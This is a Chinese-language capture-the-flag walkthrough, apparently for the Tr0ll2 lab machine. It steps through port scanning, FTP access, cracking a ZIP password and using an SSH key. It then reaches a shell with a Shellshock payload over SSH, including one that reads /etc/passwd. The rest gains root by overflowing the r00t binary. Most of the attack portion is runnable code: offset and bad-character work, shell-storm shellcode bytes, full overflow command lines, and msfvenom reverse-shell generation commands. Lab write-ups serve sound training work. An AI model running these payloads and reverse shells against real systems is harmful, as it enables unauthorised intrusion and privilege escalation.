1、alivecheck 1.6-快速扫描
发现http://192.168.4.15/

2、nmap -sS -sV -A -T5 192.168.4.15

21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))

3、FTP枚举

ftp 192.168.4.15
账号：Tr0ll
密码：Tr0ll
dir
get lmao.zip

或者通过浏览器下载！

4、dirb http://192.168.4.15/

http://192.168.4.15/robots.txt


下载：wget http://192.168.4.15/robots.txt
然后进行页面爆破：dirb http://192.168.4.15/ robots.txt
获得：
http://192.168.4.15/dont_bother/
源码提示：<!--What did you really think to find here? Try Harder!>
<img src='cat_the_troll.jpg'>
存在cat_the_troll.jpg图片文件，继续查看！

http://192.168.4.15/dont_bother/cat_the_troll.jpg
发现还是一样的图片，下载查看信息！
wget http://192.168.4.15/dont_bother/cat_the_troll.jpg

项目一教过了三种方式查看图片隐写信息：strings cat_the_troll.jpg
Look Deep within y0ur_self for the answer
告知我们前往y0ur_self寻找线索！


5、web信息收集

访问：http://192.168.4.15/y0ur_self/
发现：http://192.168.4.15/y0ur_self/answer.txt
全都是base64编码的文本信息，解码：
wget http://192.168.4.15/y0ur_self/answer.txt   ----下载到本地
base64 -d answer.txt > dayu.txt    ---将整个文本base64解码后导出到dayu.txt

发现这类似一个密码本，那么来尝试爆破FTP下载的ZIP文件试试！

-----------------
6、ZIP暴力破解

fcrackzip -u -D -p dayu.txt lmao.zip

[-u|--use-unzip] 使用 unzip 清除错误密码
[-D|--dictionary] 使用字典
[-p|--init-password string] 使用字符串作为初始密码/文件

PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL

找到密码：
ItCantReallyBeThisEasyRightLOL


7、解压信息枚举
unzip lmao.zip
ItCantReallyBeThisEasyRightLOL
inflating: noob 
获得noob文件！

-----END RSA PRIVATE KEY-----
发现这是一个ssh的key文件！

chmod 400 noob
ssh -i noob noob@192.168.4.15
Warning: Permanently added '192.168.4.15' (ECDSA) to the list of known hosts.
TRY HARDER LOL!

bash CVE-2014-6271 中的远程利用漏洞：Shellshock
https://www.csoonline.com/article/2687265/remote-exploit-in-bash-cve-2014-6271.html
https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh
https://www.zdziarski.com/blog/?p=3905
https://resources.infosecinstitute.com/topic/practical-shellshock-exploitation-part-1/#gref

视频介绍：http://bloggars-online.blogspot.com/2014/10/bash-shellshock-ssh-exploit.html

前提条件是shell 设置为bash！

payload：
'() { :;}; cat /etc/passwd'
操作系统误当() { :;}; 为函数环境变量！
三种方法！


ssh -i noob noob@192.168.2.168 '() { :;}; cat /etc/passwd'
ssh -i noob noob@192.168.4.15 '() { :;}; /bin/bash'    ----这会反弹一个伪shell

python -c 'import pty; pty.spawn("/bin/bash")'

env  ---查看环境变量

查询具有SID权限的文件，将错误输出到/dev/unll：
find / -perm -4000 2>/dev/null     ----查找所有目录中文件属性具有读、写权限，查看rwsr的文件！


cd /nothing_to_see_here/choose_wisely/door2

8、提权-缓冲区溢出

./r00t
Usage: ./r00t input

测试是否存在缓冲区溢出：
python -c 'print "A" * 300'   ---生成300个A
./r00t AAAAA.......
Segmentation fault   ----分段错误，存在溢出！


可以放入本地分析：
base64 r00t
cat base64.txt | base64 -d > r00t

其中strcpy以及printf可能存在溢出和格式化字符串漏洞


1）开始找偏移量
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

获得：0x6a413969

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6a413969
[*] Exact match at offset 268

获得偏移量268

2）ASLR查询
<_here/choose_wisely/door2$ cat /proc/sys/kernel/randomize_va_space          
0

发现没有开启！

3）checksec保护机制
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial


--------------
方法1：偏移量268

1）找esp值：验证EIP
./r00t $(python -c 'print "A" * 300')
r $(python -c 'print "A"*268 + "B"*4')
r $(python -c 'print "A"*268 + "B"*4 + "C"*20')


2）获取ESP（下一跳值）
0xbffffb80
\x80\xfb\xff\xbf

3）shellcode  841 827 ----只要搜linux/x86 /bin/bash或者/bin/sh

现在需要获取一些shellcode，www.shell-storm.org/shellcode这是非常好的一个写shellcode的学习网站，利用存储已编写的Shellcode。因为它运行在Intel，并且操作系统是32位Linux，因此我从此处获取Shellcode连接：
http://shell-storm.org/shellcode/
http://shell-storm.org/shellcode/files/shellcode-827.php

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

4）exp

./r00t $(python -c 'print "A"*偏移量 + "ESP" + "\x90"*20 + "shellcode"')

"\x90"*20 : nop sel
--------
./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
--------
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

0xbffffb80
\x80\xfb\xff\xbf

run $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * 20 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')

./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * 20 + "\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80"')

----------------------------------------

方法2：

1）找esp值：验证EIP
./r00t $(python -c 'print "A" * 300')
r $(python -c 'print "A"*268 + "B"*4')
r $(python -c 'print "A"*268 + "B"*4 + "C"*20')


2）获取ESP（下一跳值）
0xbffffb80
\x80\xfb\xff\xbf


3）确认坏字符
缓冲区溢出的在生成shellcode时，会影响输入的字符，比如’n’字符会终止输入，会截断输入导致我们输入的字符不能完全进入缓冲区。常见的坏字符有x0a、x0b、x00


现在生成一串与字节数组相同的坏字符。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串：
---------
#!/usr/bin/env python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
---------
r $(python -c 'print "A"*171 + "B"*4 + ""')


x/256x $esp   ---如果出问题就x和b换用

能看到1-8是正常的，后门就全乱了，怀疑0x08后面的0x00和0x09是个坏字符，至于后面全乱序猜测是因为0x0a换行符的问题。重新来，去掉0x09和0x0a：

好看多了，但是从0x20又开始乱了，去掉0x20后门就好了。
注意：这一定要仔细看，因为看少了看错了都会导致msf的payload执行不成功！
重新来，去掉0x09、0x0a和0x20：

坏字符总结为0x09、0x0a、0x20、再加个0x00！（默认排除空字节\x00）
\x00 \x0a \x0b \x09  \x20

4）msf生成payload
-----------
windows：
msfvenom -p windows/shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -f py -v

Linux：
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -b "\x00\x09\x0a\x20" EXITFUNC=thread -f c

linux2：
msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -fc

payload：
-a  框架选择
-p 载荷类型

LHOST 本机地址
LPORT

-b 坏字符
-e 要使用的编码器
-f 编译的语言
-c 指定要包含的附加 win32 shellcode 文件
-v 载荷的名称
------------
6）bash执行shell

"\xbb\x75\xc8\xc9\xe2\xd9\xec\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x0b\x83\xc7\x04\x31\x5f\x11\x03\x5f\x11\xe2\x80\xa2\xc2\xba\xf3\x61\xb3\x52\x2e\xe5\xb2\x44\x58\xc6\xb7\xe2\x98\x70\x17\x91\xf1\xee\xee\xb6\x53\x07\xf8\x38\x53\xd7\xd6\x5a\x3a\xb9\x07\xe8\xd4\x45\x0f\x5d\xad\xa7\x62\xe1"


./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90"*20 + "\xbb\x75\xc8\xc9\xe2\xd9\xec\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x0b\x83\xc7\x04\x31\x5f\x11\x03\x5f\x11\xe2\x80\xa2\xc2\xba\xf3\x61\xb3\x52\x2e\xe5\xb2\x44\x58\xc6\xb7\xe2\x98\x70\x17\x91\xf1\xee\xee\xb6\x53\x07\xf8\x38\x53\xd7\xd6\x5a\x3a\xb9\x07\xe8\xd4\x45\x0f\x5d\xad\xa7\x62\xe1"')


-----------












